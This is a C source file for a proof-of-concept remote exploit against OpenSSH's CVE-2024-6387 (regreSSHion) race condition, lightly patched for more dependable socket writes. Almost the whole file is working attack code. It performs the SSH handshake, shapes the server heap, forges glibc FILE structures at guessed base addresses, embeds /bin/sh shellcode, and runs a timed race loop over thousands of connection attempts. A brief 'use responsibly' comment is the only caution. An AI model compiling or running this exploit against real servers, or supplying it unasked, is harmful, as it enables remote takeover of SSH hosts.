/*
 * exploit.c - patched for robust socket sends (avoid EAGAIN spam)
 *
 * PoC for CVE-2024-6387 (regreSSHion) with small changes:
 *  - Do NOT set the socket to non-blocking mode.
 *  - Use write_all() to handle partial writes and EAGAIN/EWOULDBLOCK.
 *
 * Compile: gcc -o regreSSHion exploit.c -lpthread
 *
 * Use responsibly on machines you own / are authorized to test.
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <signal.h>

#define MAX_PACKET_SIZE (256 * 1024)
#define LOGIN_GRACE_TIME 120
#define MAX_STARTUPS 100
#define CHUNK_ALIGN(s) (((s) + 15) & ~15)

/* Possible glibc base addresses (adjust per target) */
uint64_t GLIBC_BASES[] = { 0xb7200000, 0xb7400000 };
int NUM_GLIBC_BASES = sizeof(GLIBC_BASES) / sizeof(GLIBC_BASES[0]);

/* Example shellcode placeholder (execve /bin/sh). Replace if needed. */
unsigned char shellcode[] =
  "\x31\xc0"
  "\x50"
  "\x68\x2f\x2f\x73\x68"
  "\x68\x2f\x62\x69\x6e"
  "\x89\xe3"
  "\x50"
  "\x53"
  "\x89\xe1"
  "\x99"
  "\xb0\x0b"
  "\xcd\x80";

/* Prototypes */
int setup_connection(const char *ip, int port);
ssize_t write_all(int sock, const void *buf, size_t len);
void send_packet(int sock, unsigned char packet_type, const unsigned char *data, size_t len);
void send_ssh_version(int sock);
int receive_ssh_version(int sock);
void send_kex_init(int sock);
int receive_kex_init(int sock);
int perform_ssh_handshake(int sock);
void prepare_heap(int sock);
void create_fake_file_structure(char *data, size_t size, uint64_t glibc_base);
void create_public_key_packet(unsigned char *packet, size_t size, uint64_t glibc_base);
double measure_response_time(int sock, int error_type);
void time_final_packet(int sock, double *parsing_time);
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base);
int perform_exploit(const char *ip, int port);

/* Debug control (set REGRE_DEBUG=1 in environment to enable) */
int DEBUG = 0;
/* Minimal/gentle mode (set REGRE_MINIMAL=1 in environment to enable) */
int MINIMAL = 0;

/* Helper: robust write that handles partial writes and EAGAIN/EWOULDBLOCK */
ssize_t write_all(int sock, const void *buf, size_t len) {
    const unsigned char *p = (const unsigned char *)buf;
    size_t total = 0;
    while (total < len) {
        if (DEBUG) {
            fprintf(stderr, "write_all: sending %zu bytes (remaining %zu)\n", len - total, len);
        }
        ssize_t w = send(sock, p + total, len - total, MSG_NOSIGNAL);
        if (w < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                usleep(1000); /* small backoff */
                continue;
            }
            if (DEBUG) perror("write_all: send");
            else fprintf(stderr, "write_all: send failed: %s\n", strerror(errno));
            return -1;
        }
        if (w == 0) {
            /* socket closed */
            if (DEBUG) fprintf(stderr, "write_all: socket closed while sending\n");
            return total;
        }
        if (DEBUG) fprintf(stderr, "write_all: wrote %zd bytes\n", w);
        total += (size_t)w;
    }
    return (ssize_t)total;
}

/* send_packet constructs an SSH-style packet and sends it robustly */
void send_packet(int sock, unsigned char packet_type, const unsigned char *data, size_t len) {
    unsigned char packet[MAX_PACKET_SIZE];
    size_t packet_len = len + 5;
    if (packet_len > sizeof(packet)) {
        fprintf(stderr, "send_packet: packet too large (%zu)\n", packet_len);
        return;
    }
    packet[0] = (packet_len >> 24) & 0xFF;
    packet[1] = (packet_len >> 16) & 0xFF;
    packet[2] = (packet_len >> 8) & 0xFF;
    packet[3] = packet_len & 0xFF;
    packet[4] = packet_type;
    memcpy(packet + 5, data, len);

    if (write_all(sock, packet, packet_len) < 0) {
        /* write_all already printed an error */
    }
}

/* Small helper to send SSH version string; use write_all */
void send_ssh_version(int sock) {
    const char *ssh_version = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n";
    if (write_all(sock, ssh_version, strlen(ssh_version)) < 0) {
        perror("send ssh version");
    }
}

/* Receive SSH version - has loop to handle EAGAIN if encountered */
int receive_ssh_version(int sock) {
    char buffer[256];
    ssize_t received;
    do {
        received = recv(sock, buffer, sizeof(buffer) - 1, 0);
    } while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    if (received > 0) {
        buffer[received] = '\0';
        printf("Received SSH version: %s", buffer);
        return 0;
    } else if (received == 0) {
        fprintf(stderr, "Connection closed while receiving SSH version\n");
    } else {
        perror("receive ssh version");
    }
    return -1;
}

/* send_kex_init uses send_packet wrapper */
void send_kex_init(int sock) {
    unsigned char kexinit_payload[36] = { 0 };
    /* minimal payload - PoC uses a simple filler */
    send_packet(sock, 20, kexinit_payload, sizeof(kexinit_payload));
}

/* receive_kex_init waits for the remote KEX_INIT */
int receive_kex_init(int sock) {
    unsigned char buffer[1024];
    ssize_t received;
    do {
        received = recv(sock, buffer, sizeof(buffer), 0);
    } while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    if (received > 0) {
        printf("Received KEX_INIT (%zd bytes)\n", received);
        return 0;
    } else if (received == 0) {
        fprintf(stderr, "Connection closed while receiving KEX_INIT\n");
    } else {
        perror("receive kex init");
    }
    return -1;
}

/* perform_ssh_handshake: send version, receive version, kex init, receive kex init */
int perform_ssh_handshake(int sock) {
    send_ssh_version(sock);
    if (receive_ssh_version(sock) < 0) return -1;
    send_kex_init(sock);
    if (receive_kex_init(sock) < 0) return -1;
    return 0;
}

/* setup_connection: create and connect socket; do NOT set non-blocking */
int setup_connection(const char *ip, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct sockaddr_in server_addr;
    memset (&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("inet_pton");
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("connect");
        close(sock);
        return -1;
    }

    /* Keep socket in blocking mode; robust send logic handles blocking behavior. */
    return sock;
}

/* prepare_heap: series of packets to shape remote heap (as in original PoC) */
void prepare_heap(int sock) {
    int rounds = MINIMAL ? 6 : 27;

    /* Packet a: tcache churn */
    for (int i = 0; i < 10; i++) {
        unsigned char tcache_chunk[64];
        memset(tcache_chunk, 'A', sizeof(tcache_chunk));
        send_packet(sock, 5, tcache_chunk, sizeof(tcache_chunk));
    }

    /* Packet b: create large and small holes */
    for (int i = 0; i < rounds; i++) {
        unsigned char large_hole[8192];
        memset(large_hole, 'B', sizeof(large_hole));
        send_packet(sock, 5, large_hole, sizeof(large_hole));
        usleep(1000);

        unsigned char small_hole[320];
        memset(small_hole, 'C', sizeof(small_hole));
        send_packet(sock, 5, small_hole, sizeof(small_hole));
        usleep(500);
    }

    /* Packet c: fake structures to leak/forge FILE */
    for (int i = 0; i < rounds; i++) {
        unsigned char fake_data[4096];
        create_fake_file_structure((char *)fake_data, sizeof(fake_data), GLIBC_BASES[0]);
        send_packet(sock, 5, fake_data, sizeof(fake_data));
        usleep(1000);
    }

    /* Packet d: big string to ensure bins (send near-MAX_PACKET_SIZE) */
    size_t big_len = MAX_PACKET_SIZE - 5; /* account for 5-byte header in send_packet */
    unsigned char *large_string = malloc(big_len);
    if (large_string) {
        memset(large_string, 'E', big_len);
        send_packet(sock, 5, large_string, big_len);
        free(large_string);
    }
}

/* create_fake_file_structure: write a fake FILE-like structure into data */
void create_fake_file_structure(char *data, size_t size, uint64_t glibc_base) {
    memset(data, 0, size);
    struct {
        void *_IO_read_ptr;
        void *_IO_read_end;
        void *_IO_read_base;
        void *_IO_write_base;
        void *_IO_write_ptr;
        void *_IO_write_end;
        void *_IO_buf_base;
        void *_IO_buf_end;
        void *_IO_save_base;
        void *_IO_backup_base;
        void *_IO_save_end;
        void *_markers;
        void *_chain;
        int _fileno;
        int _flags;
        int _mode;
        char _unused2[40];
        void *_vtable_offset;
    } *fake_file = (void *)data;

    fake_file->_vtable_offset = (void *)0x61;
    /* place fake vtable and codecvt pointers at end as in PoC */
    if (size >= 24) {
        *(uint64_t *)(data + size - 16) = glibc_base + 0x21b740; /* fake vtable */
        *(uint64_t *)(data + size - 8) = glibc_base + 0x21d7f8;  /* fake _codecvt */
    }
}

/* create_public_key_packet: build large packet containing many chunks and shellcode */
void create_public_key_packet(unsigned char *packet, size_t size, uint64_t glibc_base) {
    memset(packet, 0, size);
    size_t offset = 0;
    int rounds = MINIMAL ? 6 : 27;
    for (int i = 0; i < rounds; i++) {
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(4096);
        offset += CHUNK_ALIGN(4096);
        *(uint32_t *)(packet + offset) = CHUNK_ALIGN(304);
        offset += CHUNK_ALIGN(304);
    }
    memcpy(packet, "ssh-rsa ", 8);

    /* place shellcode approximately in the middle (PoC style) */
    size_t shell_offset = CHUNK_ALIGN(4096) * (rounds/2) + CHUNK_ALIGN(304) * (rounds/2);
    if (shell_offset + sizeof(shellcode) < size) {
        memcpy(packet + shell_offset, shellcode, sizeof(shellcode));
    }
    for (int i = 0; i < rounds; i++) {
        size_t pos = CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i;
        if (pos + CHUNK_ALIGN(304) <= size) {
            create_fake_file_structure((char *)(packet + pos), CHUNK_ALIGN(304), glibc_base);
        }
    }
}

/* measure_response_time: send a USERAUTH-like packet and time recv */
double measure_response_time(int sock, int error_type) {
    unsigned char error_packet[1024];
    size_t packet_size;
    if (error_type == 1) {
        packet_size = snprintf((char *)error_packet, sizeof(error_packet),
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3");
    } else {
        packet_size = snprintf((char *)error_packet, sizeof(error_packet),
            "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9");
    }

    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    send_packet(sock, 50, error_packet, packet_size); /* SSH_MSG_USERAUTH_REQUEST */

    char response[1024];
    ssize_t received;
    do {
        received = recv(sock, response, sizeof(response), 0);
    } while (received < 0 && (errno == EWOULDBLOCK || errno == EAGAIN));

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (double)(end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    (void)received; /* we only care about timing */
    return elapsed;
}

/* time_final_packet: sample parse times before/after */
void time_final_packet(int sock, double *parsing_time) {
    double time_before = measure_response_time(sock, 1);
    double time_after = measure_response_time(sock, 2);
    *parsing_time = time_after - time_before;
    printf("Estimated parsing time: %.6f seconds\n", *parsing_time);
}

/* attempt_race_condition: send final_packet-1 then wait and send last byte */
int attempt_race_condition(int sock, double parsing_time, uint64_t glibc_base) {
    unsigned char final_packet[MAX_PACKET_SIZE];
    create_public_key_packet(final_packet, sizeof(final_packet), glibc_base);

    /* robustly send all but the last byte */
    size_t to_send = sizeof(final_packet) - 1;
    if (write_all(sock, final_packet, to_send) < 0) {
        fprintf(stderr, "send final packet failed\n");
        return 0;
    }

    /* precise timing for last byte */
    struct timespec start, current;
    clock_gettime(CLOCK_MONOTONIC, &start);

    while (1) {
        clock_gettime(CLOCK_MONOTONIC, &current);
        double elapsed = (current.tv_sec - start.tv_sec)
                       + (current.tv_nsec - start.tv_nsec) / 1e9;
        if (elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001)) {
            /* send the last byte robustly using write_all (MSG_NOSIGNAL set inside)
               so we don't get killed by SIGPIPE when the peer has closed. */
            if (write_all(sock, &final_packet[sizeof(final_packet) - 1], 1) < 0) {
                fprintf(stderr, "send last byte failed\n");
                return 0;
            }
            break;
        }
    }

    /* Check for successful exploitation by reading response */
    char response[1024];
    ssize_t received = recv(sock, response, sizeof(response), 0);
    if (received > 0) {
        printf("Received response after exploit attempt (%zd bytes)\n", received);
        if (memcmp(response, "SSH-2.0-", 8) != 0) {
            printf("Possible hit on 'large' race window\n");
            return 1;
        }
    } else if (received == 0) {
        printf("Connection closed by server - possible successful exploitation\n");
        return 1;
    } else if (errno == EWOULDBLOCK || errno == EAGAIN) {
        printf("No immediate response from server - possible successful exploitation\n");
        return 1;
    } else {
        perror("recv");
    }
    return 0;
}

/* perform_exploit: main attempt loop (feedback-based timing) */
int perform_exploit(const char *ip, int port) {
    int success = 0;
    double parsing_time = 0;
    double timing_adjustment = 0;

    for (int base_idx = 0; base_idx < NUM_GLIBC_BASES && !success; base_idx++) {
        uint64_t glibc_base = GLIBC_BASES[base_idx];
        printf("Attempting exploitation with glibc base: 0x%lx\n", glibc_base);

        for (int attempt = 0; attempt < 10000 && !success; attempt++) {
            if (attempt % 1000 == 0) {
                printf("Attempt %d of 10000\n", attempt);
            }

            int sock = setup_connection(ip, port);
            if (sock < 0) {
                fprintf(stderr, "Failed to establish connection, attempt %d\n", attempt);
                continue;
            }

            if (perform_ssh_handshake(sock) < 0) {
                fprintf(stderr, "SSH handshake failed, attempt %d\n", attempt);
                close(sock);
                continue;
            }

            prepare_heap(sock);
            time_final_packet(sock, &parsing_time);

            parsing_time += timing_adjustment;

            if (attempt_race_condition(sock, parsing_time, glibc_base)) {
                printf("Possible exploitation success on attempt %d with glibc base 0x%lx!\n", attempt, glibc_base);
                success = 1;
            } else {
                timing_adjustment += 0.00001; /* small incremental adjustment */
            }

            close(sock);
            usleep(100000); /* 100ms delay between attempts */
        }
    }

    return success;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <ip> <port>\n", argv[0]);
        exit(1);
    }
    const char *ip = argv[1];
    int port = atoi(argv[2]);

    srand(time(NULL));
    signal(SIGPIPE, SIG_IGN);
    /* initialize debug/minimal flags from environment */
    if (getenv("REGRE_DEBUG") && atoi(getenv("REGRE_DEBUG")) == 1) DEBUG = 1;
    if (getenv("REGRE_MINIMAL") && atoi(getenv("REGRE_MINIMAL")) == 1) MINIMAL = 1;
    int res = perform_exploit(ip, port);
    return (res ? 0 : 1);
}